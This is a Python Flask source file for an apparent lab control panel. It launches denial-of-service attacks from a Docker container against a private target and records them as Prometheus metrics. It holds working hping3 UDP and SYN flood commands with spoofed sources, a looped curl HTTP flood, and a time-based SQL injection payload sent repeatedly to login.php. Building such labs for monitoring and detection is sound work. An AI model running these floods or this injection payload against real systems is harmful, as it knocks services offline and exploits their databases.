import json
import subprocess
import time
from threading import Lock

from flask import Flask, Response, render_template
from prometheus_client import Counter, Gauge, generate_latest

app = Flask(__name__)

TARGET_IP = "172.20.10.10"
ATTACK_STATE_LOCK = Lock()

ATTACK_LAUNCH_TOTAL = Counter(
    "attack_launch_total",
    "Numero de veces que se ha lanzado cada ataque desde el panel",
    ["attack"],
)
ATTACK_ACTIVE = Gauge(
    "attack_active",
    "Indica si un ataque esta marcado como activo desde el panel",
    ["attack"],
)
ATTACK_LAST_START = Gauge(
    "attack_last_start_timestamp_seconds",
    "Marca de tiempo del ultimo lanzamiento registrado por ataque",
    ["attack"],
)
ATTACK_LAST_STOP = Gauge(
    "attack_last_stop_timestamp_seconds",
    "Marca de tiempo del ultimo evento stop registrado por ataque",
    ["attack"],
)

ATAQUES = {
    "udp": {
        "label": "UDP Flood",
        "command": [
            "docker",
            "exec",
            "-d",
            "atacante",
            "hping3",
            "--udp",
            "-d",
            "1000",
            "-p",
            "80",
            "--flood",
            "--rand-source",
            TARGET_IP,
        ],
    },
    "syn": {
        "label": "SYN Flood",
        "command": [
            "docker",
            "exec",
            "-d",
            "atacante",
            "hping3",
            "-S",
            "-p",
            "80",
            "--flood",
            "--rand-source",
            TARGET_IP,
        ],
    },
    "http": {
        "label": "HTTP Flood",
        "command": [
            "docker",
            "exec",
            "-d",
            "atacante",
            "sh",
            "-lc",
            f"for i in $(seq 1 20); do while true; do curl -s http://{TARGET_IP} -o /dev/null; done & done; wait",
        ],
    },
    "sqli_dos": {
        "label": "SQLi DoS",
        "command": [
            "docker",
            "exec",
            "-d",
            "atacante",
            "sh",
            "-lc",
            (
                "for i in $(seq 1 30); do while true; do "
                f"curl -s -X POST -d \"usuario=%27+OR+SLEEP(5)%3D0+--+\" http://{TARGET_IP}/login.php > /dev/null; "
                "done & done; wait"
            ),
        ],
    },
}

for attack in ATAQUES:
    ATTACK_ACTIVE.labels(attack=attack).set(0)
    ATTACK_LAST_START.labels(attack=attack).set(0)
    ATTACK_LAST_STOP.labels(attack=attack).set(0)


def log_event(event, attack="all", status="ok", details=None):
    payload = {
        "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "event": event,
        "attack": attack,
        "status": status,
    }
    if details:
        payload["details"] = details
    print(json.dumps(payload, ensure_ascii=True), flush=True)


def run_command(command):
    return subprocess.run(command, capture_output=True, text=True, check=False)


def list_attack_processes():
    result = run_command(
        ["docker", "exec", "atacante", "ps", "-eo", "pid=,args="]
    )
    if result.returncode != 0:
        return result.returncode, result.stderr.strip() or result.stdout.strip(), []

    markers = (
        "hping3",
        "http://172.20.10.10 -o /dev/null",
        "login.php",
        "SLEEP(5)",
        "curl -s -X POST",
    )
    lines = []
    for raw_line in result.stdout.splitlines():
        line = raw_line.strip()
        if not line:
            continue
        if any(marker in line for marker in markers):
            lines.append(line)
    return 0, "", lines


def stop_all_attacks():
    stop_command = ["docker", "exec", "atacante", "sh", "/opt/lab_scripts/attacker/stop_attacks.sh"]
    result = run_command(stop_command)
    verify_code, verify_error, residual_processes = list_attack_processes()
    now = time.time()
    with ATTACK_STATE_LOCK:
        for attack in ATAQUES:
            ATTACK_ACTIVE.labels(attack=attack).set(0)
            ATTACK_LAST_STOP.labels(attack=attack).set(now)

    details = result.stderr.strip() or result.stdout.strip()
    if verify_error:
        details = verify_error
    elif residual_processes:
        details = "Procesos residuales: " + "; ".join(residual_processes[:10])

    log_event(
        "attack_stopped",
        status="ok" if result.returncode == 0 and verify_code == 0 and not residual_processes else "error",
        details=details,
    )
    return result


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/health")
def health():
    return {"status": "ok"}, 200


@app.route("/metrics")
def metrics():
    return Response(generate_latest(), mimetype="text/plain; version=0.0.4")


@app.route("/atacar/<tipo>")
def atacar(tipo):
    if tipo == "stop":
        result = stop_all_attacks()
        verify_code, verify_error, residual_processes = list_attack_processes()
        if result.returncode != 0:
            return f"No se pudo detener por completo: {result.stderr.strip()}", 500
        if verify_code != 0:
            return f"No se pudo verificar el estado del atacante: {verify_error}", 500
        if residual_processes:
            details = "; ".join(residual_processes[:10])
            return f"No se pudo detener por completo: {details}", 500
        return "Ataques detenidos", 200

    if tipo not in ATAQUES:
        return "Tipo no válido", 400

    definition = ATAQUES[tipo]
    result = run_command(definition["command"])
    if result.returncode != 0:
        log_event(
            "attack_start_failed",
            attack=tipo,
            status="error",
            details=result.stderr.strip() or result.stdout.strip(),
        )
        return f"No se pudo iniciar {tipo}: {result.stderr.strip()}", 500

    now = time.time()
    with ATTACK_STATE_LOCK:
        ATTACK_LAUNCH_TOTAL.labels(attack=tipo).inc()
        ATTACK_ACTIVE.labels(attack=tipo).set(1)
        ATTACK_LAST_START.labels(attack=tipo).set(now)

    log_event("attack_started", attack=tipo, details=" ".join(definition["command"]))
    return f"Ataque {tipo} iniciado", 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
